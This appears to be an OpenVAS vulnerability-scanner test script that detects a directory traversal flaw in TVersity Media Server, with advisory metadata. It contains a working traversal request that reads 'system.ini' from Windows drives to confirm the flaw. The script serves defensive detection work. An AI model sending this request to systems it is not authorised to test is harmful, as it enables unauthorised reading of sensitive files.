###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tversity_dir_trav_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# TVersity Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802619");
  script_version("$Revision: 11374 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-03-15 12:12:12 +0530 (Thu, 15 Mar 2012)");
  script_name("TVersity Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18603");
  script_xref(name:"URL", value:"http://aluigi.org/adv/tversity_1-adv.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110802/tversity_1-adv.txt");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 41952);
  script_mandatory_keys("TVersity_Media_Server/banner");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain sensitive
  information, which can lead to launching further attacks.");
  script_tag(name:"affected", value:"TVersity version 1.9.7 and prior");
  script_tag(name:"insight", value:"The flaw is due to an input validation error in the TVersity
  media server when processing web requests can be exploited to disclose
  arbitrary files via directory traversal attacks.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running TVersity and is prone to directory traversal
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:41952);

banner = get_http_banner(port: port);
if(!banner || "TVersity Media Server" >!< banner){
  exit(0);
}

foreach dir (make_list("c:", "d:", "e:", "f:"))
{
  url = "/geturl/%2e?type=audio/mpeg&url=file://" + dir +
        "/windows/&ext=system.ini";

  if(http_vuln_check(port:port, url:url, pattern:"\[drivers\]",
                     check_header:TRUE))
  {
    report = report_vuln_url( port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
